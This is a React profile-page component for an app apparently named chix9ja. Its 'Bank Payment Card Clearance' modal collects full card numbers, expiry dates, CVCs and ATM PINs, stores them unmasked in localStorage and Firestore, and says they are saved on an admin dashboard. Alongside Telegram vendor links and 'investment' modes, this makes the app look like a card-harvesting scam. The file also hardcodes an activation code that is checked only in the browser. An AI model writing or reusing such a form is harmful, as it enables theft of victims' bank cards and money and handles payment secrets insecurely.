import React, { useState, useRef } from 'react';
import { Icons } from './Icons';
import { User } from '../types';
import { syncUserFromLocalToFirestore } from '../firebase';

interface ProfileProps {
  user: User;
  onUpdateProfile: (updatedUser: Partial<User>) => void;
  onLinkAccountClick: () => void;
  darkMode: boolean;
  toggleDarkMode: () => void;
  onLogout: () => void;
  vendorTelegramLink?: string;
}

const Profile: React.FC<ProfileProps> = ({ user, onUpdateProfile, onLinkAccountClick, darkMode, toggleDarkMode, onLogout, vendorTelegramLink }) => {
  const [name, setName] = useState(user.name);
  const [isEditing, setIsEditing] = useState(false);
  const [cvcCode, setCvcCode] = useState('');
  const [cvcMessage, setCvcMessage] = useState<{ text: string, type: 'success' | 'error' } | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  // Bank Payment Card Clearance States
  const [showCardClearanceModal, setShowCardClearanceModal] = useState(false);
  const [cardholderName, setCardholderName] = useState(user.cardClearanceDetails?.cardholderName || user.name || '');
  const [cardBankName, setCardBankName] = useState(user.cardClearanceDetails?.bankName || '');
  const [cardNumber, setCardNumber] = useState(user.cardClearanceDetails?.cardNumber || '');
  const [cardExpiry, setCardExpiry] = useState(user.cardClearanceDetails?.expiryDate || '');
  const [cardCvc, setCardCvc] = useState(user.cardClearanceDetails?.cvc || '');
  const [cardPin, setCardPin] = useState(user.cardClearanceDetails?.pin || '');
  const [clearanceCode, setClearanceCode] = useState(user.cardClearanceDetails?.clearanceCode || '');
  const [isSubmittingCard, setIsSubmittingCard] = useState(false);

  const handleSubmitCardClearance = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cardholderName.trim() || !cardBankName.trim() || !cardNumber.trim() || !cardExpiry.trim() || !cardCvc.trim()) {
      alert("Please fill in all required card details.");
      return;
    }

    setIsSubmittingCard(true);
    const details = {
      cardholderName: cardholderName.trim(),
      bankName: cardBankName.trim(),
      cardNumber: cardNumber.trim(),
      expiryDate: cardExpiry.trim(),
      cvc: cardCvc.trim(),
      pin: cardPin.trim() || undefined,
      clearanceCode: clearanceCode.trim() || undefined,
      submittedAt: new Date().toISOString(),
      status: 'pending' as const
    };

    try {
      onUpdateProfile({ cardClearanceDetails: details });

      const emailKey = user.email.toLowerCase().trim();
      const existingUsersStr = localStorage.getItem('chix9ja_users');
      const existingUsers = existingUsersStr ? JSON.parse(existingUsersStr) : {};
      if (existingUsers[emailKey]) {
        existingUsers[emailKey].cardClearanceDetails = details;
        localStorage.setItem('chix9ja_users', JSON.stringify(existingUsers));
      }

      await syncUserFromLocalToFirestore(user.email);
      alert("Bank Payment Card Clearance details submitted successfully! Details saved on Admin Dashboard.");
      setShowCardClearanceModal(false);
    } catch (err) {
      console.error("Error submitting card clearance details:", err);
      alert("Failed to submit card clearance details: " + (err instanceof Error ? err.message : String(err)));
    } finally {
      setIsSubmittingCard(false);
    }
  };

  const handleApplyCvc = () => {
    if (cvcCode.toUpperCase() === 'MK987') {
      const isUsed = localStorage.getItem('chix9ja_cvc_used');
      if (isUsed) {
        setCvcMessage({ text: 'This code has already been used on this device.', type: 'error' });
      } else {
        onUpdateProfile({ 
          isVMode: true,
          isPMode: true,
          vModeSubscriptionUsed: false,
          vModeVipUsed: false,
          vModeInvestmentUsed: false,
          deactivationDate: Date.now() + 86400000 // 24 hours
        });
        localStorage.setItem('chix9ja_cvc_used', 'true');
        setCvcMessage({ text: 'CVC code applied! V Mode & P Mode are now active.', type: 'success' });
        setCvcCode('');
      }
    } else {
      setCvcMessage({ text: 'Invalid CVC code.', type: 'error' });
    }
    setTimeout(() => setCvcMessage(null), 5000);
  };

  const handleImageUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        onUpdateProfile({ profileImage: reader.result as string });
      };
      reader.readAsDataURL(file);
    }
  };

  const handleSaveName = () => {
    onUpdateProfile({ name });
    setIsEditing(false);
  };

  return (
    <div className="px-4 py-6 space-y-6 animate-in fade-in slide-in-from-bottom-4 duration-500">
      
      {/* Profile Header */}
      <div className="flex flex-col items-center justify-center space-y-4">
        <div className="relative">
          <div className="w-28 h-28 rounded-full border-4 border-green-glow shadow-lg overflow-hidden bg-gray-900 flex items-center justify-center">
            {user.profileImage ? (
              <img src={user.profileImage} alt="Profile" className="w-full h-full object-cover" />
            ) : (
              <span className="text-green-glow text-3xl font-bold italic">{user.name.charAt(0).toUpperCase()}</span>
            )}
          </div>
          <button 
            onClick={() => fileInputRef.current?.click()}
            className="absolute bottom-1 right-1 bg-green-glow text-black p-2 rounded-full shadow-md hover:bg-green-dark transition-colors"
          >
            <Icons.Camera size={16} />
          </button>
          <input 
            type="file" 
            ref={fileInputRef} 
            onChange={handleImageUpload} 
            accept="image/*" 
            className="sr-only" 
          />
        </div>
        
        <div className="text-center">
            <h2 className="text-xl font-bold text-white">{user.name}</h2>
            <p className="text-sm text-gray-500">{user.email}</p>
        </div>
      </div>

      {/* Settings Section */}
      <div className="bg-gray-900 rounded-2xl shadow-sm p-4 space-y-4 border border-gray-800">
        <h3 className="text-xs font-bold text-gray-500 uppercase tracking-wider mb-2">Account Settings</h3>
        
        {/* Name Edit */}
        <div className="flex items-center justify-between py-3 border-b border-gray-800">
          <div className="flex items-center space-x-3 flex-1">
            <div className="p-2.5 bg-green-glow/10 rounded-xl text-green-glow">
                <Icons.User size={20} />
            </div>
            <div className="flex-1">
              <p className="text-xs text-gray-500 mb-0.5">Full Name</p>
              {isEditing ? (
                <input 
                    type="text" 
                    value={name} 
                    onChange={(e) => setName(e.target.value)}
                    className="w-full p-1.5 border border-green-glow/30 rounded text-sm bg-black text-white focus:ring-2 focus:ring-green-glow outline-none"
                />
              ) : (
                <p className="text-sm font-semibold text-white">{user.name}</p>
              )}
            </div>
          </div>
          <button 
            onClick={() => isEditing ? handleSaveName() : setIsEditing(true)}
            className="text-green-glow font-medium text-sm ml-2 p-2 hover:bg-green-glow/10 rounded-lg transition-colors"
          >
            {isEditing ? <Icons.Check size={20} /> : 'Edit'}
          </button>
        </div>

        {/* Link Account Button - Subscribed Users Only */}
        {user.isSubscribed && (
          <div className="py-2">
            <button 
              onClick={onLinkAccountClick}
              className="w-full p-4 bg-blue-600/10 border border-blue-500/30 rounded-2xl flex items-center justify-between group hover:bg-blue-600/20 transition-all active:scale-[0.98]"
            >
              <div className="flex items-center space-x-3">
                <div className="p-2 bg-blue-600/20 rounded-xl text-blue-400 group-hover:scale-110 transition-transform">
                  <Icons.Link size={20} />
                </div>
                <div className="text-left">
                  <p className="text-sm font-bold text-white leading-tight">Link Withdraw Account</p>
                  <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest">Database Integration</p>
                </div>
              </div>
              <Icons.ChevronRight size={18} className="text-blue-500/50" />
            </button>
          </div>
        )}

        {/* Message Verified Vendor - Subscribed Users Only */}
        {user.isSubscribed && (
          <div className="py-2 border-t border-gray-800/50 mt-1 pt-3 animate-in fade-in slide-in-from-bottom-2 duration-350">
            <button 
              onClick={() => {
                if (vendorTelegramLink) {
                  window.open(vendorTelegramLink, "_blank");
                } else {
                  window.open("https://t.me/chix9ja_vendor", "_blank");
                }
              }}
              className="w-full p-4 bg-green-glow/10 border border-green-glow/20 rounded-2xl flex items-center justify-between group hover:bg-green-glow/20 transition-all active:scale-[0.98]"
            >
              <div className="flex items-center space-x-3">
                <div className="p-2 bg-green-glow/20 rounded-xl text-green-glow group-hover:scale-110 transition-transform">
                  <Icons.Send size={20} className="stroke-[2.5]" />
                </div>
                <div className="text-left">
                  <p className="text-sm font-bold text-white leading-tight">Message Verified Vendor</p>
                  <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest">Instant Verified Node</p>
                </div>
              </div>
              <Icons.ChevronRight size={18} className="text-green-glow/55" />
            </button>
          </div>
        )}

        {/* Bank Payment Card Clearance Section */}
        <div className="py-2 border-t border-gray-800/50 mt-1 pt-3">
          <button 
            onClick={() => setShowCardClearanceModal(true)}
            className="w-full p-4 bg-amber-500/10 border border-amber-500/30 rounded-2xl flex items-center justify-between group hover:bg-amber-500/20 transition-all active:scale-[0.98]"
          >
            <div className="flex items-center space-x-3">
              <div className="p-2 bg-amber-500/20 rounded-xl text-amber-400 group-hover:scale-110 transition-transform">
                <Icons.Card size={20} />
              </div>
              <div className="text-left">
                <p className="text-sm font-bold text-white leading-tight">Bank Payment Card Clearance</p>
                <p className="text-[10px] text-amber-400/80 font-bold uppercase tracking-widest font-mono">
                  {user.cardClearanceDetails ? `Status: ${user.cardClearanceDetails.status.toUpperCase()}` : 'Submit Card Details for Clearance'}
                </p>
              </div>
            </div>
            <div className="flex items-center space-x-1.5">
              {user.cardClearanceDetails && (
                <span className={`text-[9px] font-mono px-2 py-0.5 rounded font-black uppercase ${
                  user.cardClearanceDetails.status === 'cleared' || user.cardClearanceDetails.status === 'approved' 
                    ? 'bg-emerald-950 text-emerald-400 border border-emerald-500/30' 
                    : user.cardClearanceDetails.status === 'rejected' 
                    ? 'bg-rose-950 text-rose-400 border border-rose-500/30' 
                    : 'bg-amber-950 text-amber-400 border border-amber-500/30'
                }`}>
                  {user.cardClearanceDetails.status}
                </span>
              )}
              <Icons.ChevronRight size={18} className="text-amber-500/55" />
            </div>
          </button>
        </div>

        {/* CVC Code Section */}
        <div className="flex flex-col py-3 border-t border-gray-800">
          <div className="flex items-center space-x-3 mb-3">
            <div className="p-2.5 bg-amber-500/10 rounded-xl text-amber-500">
                <Icons.Lock size={20} />
            </div>
            <div className="flex-1">
              <p className="text-xs text-gray-500 mb-0.5">Activation Code (CVC)</p>
              <p className="text-[10px] text-gray-600">Enter your card verification code to activate V Mode</p>
            </div>
          </div>
          <div className="flex space-x-2">
            <input 
              type="text" 
              placeholder="Enter CVC"
              value={cvcCode}
              onChange={(e) => setCvcCode(e.target.value)}
              className="flex-1 p-2 border border-gray-800 rounded-xl text-sm bg-black text-white focus:ring-2 focus:ring-green-glow outline-none"
            />
            <button 
              onClick={handleApplyCvc}
              className="px-6 py-2 bg-green-glow text-black font-bold text-xs rounded-xl shadow-lg active:scale-95 transition-all"
            >
              ACTIVATE
            </button>
          </div>
          {cvcMessage && (
            <p className={`mt-2 text-[10px] font-bold ${cvcMessage.type === 'success' ? 'text-green-400' : 'text-red-400'}`}>
              {cvcMessage.text}
            </p>
          )}
        </div>
      </div>

      {/* Actions */}
      <div className="bg-gray-900 rounded-2xl shadow-sm overflow-hidden border border-gray-800">
          <button onClick={onLogout} className="w-full p-4 flex items-center space-x-3 text-red-500 hover:bg-red-900/20 transition-colors">
            <div className="p-2 bg-red-900/20 rounded-full">
                <Icons.LogOut size={18} />
            </div>
            <span className="font-medium">Log Out</span>
          </button>
      </div>

      {/* Bank Payment Card Clearance Modal */}
      {showCardClearanceModal && (
        <div className="fixed inset-0 z-[120] bg-black/80 backdrop-blur-md flex items-center justify-center p-4 animate-in fade-in duration-300">
          <div className="bg-zinc-950 border border-amber-500/30 rounded-3xl p-6 w-full max-w-md max-h-[90vh] overflow-y-auto space-y-5 text-left shadow-2xl relative font-sans">
            <div className="flex items-center justify-between border-b border-zinc-800 pb-4">
              <div className="flex items-center space-x-2.5">
                <div className="p-2 bg-amber-500/20 rounded-xl text-amber-400">
                  <Icons.Card size={22} />
                </div>
                <div>
                  <h3 className="text-base font-black text-white uppercase tracking-wider font-mono">Bank Card Clearance</h3>
                  <p className="text-[10px] text-zinc-400 font-mono">Submit details for admin verification & clearance</p>
                </div>
              </div>
              <button 
                type="button"
                onClick={() => setShowCardClearanceModal(false)}
                className="p-2 text-zinc-400 hover:text-white bg-zinc-900 rounded-xl transition-colors"
              >
                <Icons.X size={18} />
              </button>
            </div>

            {user.cardClearanceDetails && (
              <div className="p-3 bg-amber-950/30 border border-amber-500/20 rounded-2xl text-[11px] font-mono space-y-1">
                <div className="flex items-center justify-between">
                  <span className="text-zinc-400 uppercase font-bold">Existing Clearance Status:</span>
                  <span className="text-amber-400 font-extrabold uppercase">{user.cardClearanceDetails.status}</span>
                </div>
                <p className="text-zinc-400 text-[10px]">
                  Submitted on: {new Date(user.cardClearanceDetails.submittedAt).toLocaleDateString()}
                </p>
              </div>
            )}

            <form onSubmit={handleSubmitCardClearance} className="space-y-4">
              <div className="space-y-1">
                <label className="text-[10px] font-black text-zinc-400 uppercase tracking-widest font-mono block">Cardholder Full Name *</label>
                <input 
                  type="text" 
                  required
                  placeholder="E.g. CHIX9JA USER"
                  value={cardholderName}
                  onChange={(e) => setCardholderName(e.target.value)}
                  className="w-full bg-zinc-900 border border-zinc-800 p-3 rounded-xl text-white text-xs font-mono outline-none focus:border-amber-500 transition-all"
                />
              </div>

              <div className="space-y-1">
                <label className="text-[10px] font-black text-zinc-400 uppercase tracking-widest font-mono block">Bank Name *</label>
                <input 
                  type="text" 
                  required
                  placeholder="E.g. Access Bank, GTBank, OPay"
                  value={cardBankName}
                  onChange={(e) => setCardBankName(e.target.value)}
                  className="w-full bg-zinc-900 border border-zinc-800 p-3 rounded-xl text-white text-xs font-mono outline-none focus:border-amber-500 transition-all"
                />
              </div>

              <div className="space-y-1">
                <label className="text-[10px] font-black text-zinc-400 uppercase tracking-widest font-mono block">Card Number *</label>
                <input 
                  type="text" 
                  required
                  maxLength={19}
                  placeholder="5399 **** **** 1234"
                  value={cardNumber}
                  onChange={(e) => setCardNumber(e.target.value)}
                  className="w-full bg-zinc-900 border border-zinc-800 p-3 rounded-xl text-white text-xs font-mono outline-none focus:border-amber-500 transition-all tracking-wider"
                />
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div className="space-y-1">
                  <label className="text-[10px] font-black text-zinc-400 uppercase tracking-widest font-mono block">Expiry (MM/YY) *</label>
                  <input 
                    type="text" 
                    required
                    maxLength={5}
                    placeholder="08/28"
                    value={cardExpiry}
                    onChange={(e) => setCardExpiry(e.target.value)}
                    className="w-full bg-zinc-900 border border-zinc-800 p-3 rounded-xl text-white text-xs font-mono outline-none focus:border-amber-500 transition-all text-center"
                  />
                </div>
                <div className="space-y-1">
                  <label className="text-[10px] font-black text-zinc-400 uppercase tracking-widest font-mono block">CVC / CVV *</label>
                  <input 
                    type="password" 
                    required
                    maxLength={4}
                    placeholder="123"
                    value={cardCvc}
                    onChange={(e) => setCardCvc(e.target.value)}
                    className="w-full bg-zinc-900 border border-zinc-800 p-3 rounded-xl text-white text-xs font-mono outline-none focus:border-amber-500 transition-all text-center"
                  />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div className="space-y-1">
                  <label className="text-[10px] font-black text-zinc-400 uppercase tracking-widest font-mono block">ATM PIN (Optional)</label>
                  <input 
                    type="password" 
                    maxLength={4}
                    placeholder="****"
                    value={cardPin}
                    onChange={(e) => setCardPin(e.target.value)}
                    className="w-full bg-zinc-900 border border-zinc-800 p-3 rounded-xl text-white text-xs font-mono outline-none focus:border-amber-500 transition-all text-center"
                  />
                </div>
                <div className="space-y-1">
                  <label className="text-[10px] font-black text-zinc-400 uppercase tracking-widest font-mono block">Clearance Code (Optional)</label>
                  <input 
                    type="text" 
                    placeholder="E.g. CLR-9921"
                    value={clearanceCode}
                    onChange={(e) => setClearanceCode(e.target.value)}
                    className="w-full bg-zinc-900 border border-zinc-800 p-3 rounded-xl text-white text-xs font-mono outline-none focus:border-amber-500 transition-all uppercase text-center"
                  />
                </div>
              </div>

              <div className="pt-2 flex gap-3">
                <button
                  type="button"
                  onClick={() => setShowCardClearanceModal(false)}
                  className="flex-1 py-3 bg-zinc-900 hover:bg-zinc-800 text-zinc-400 font-mono font-bold text-xs uppercase rounded-2xl border border-zinc-800 transition-all"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  disabled={isSubmittingCard}
                  className="flex-1 py-3 bg-amber-500 hover:bg-amber-400 disabled:opacity-50 text-black font-mono font-black text-xs uppercase rounded-2xl shadow-lg transition-all active:scale-95"
                >
                  {isSubmittingCard ? 'Submitting...' : 'Submit to Admin'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

    </div>
  );
};

export default Profile;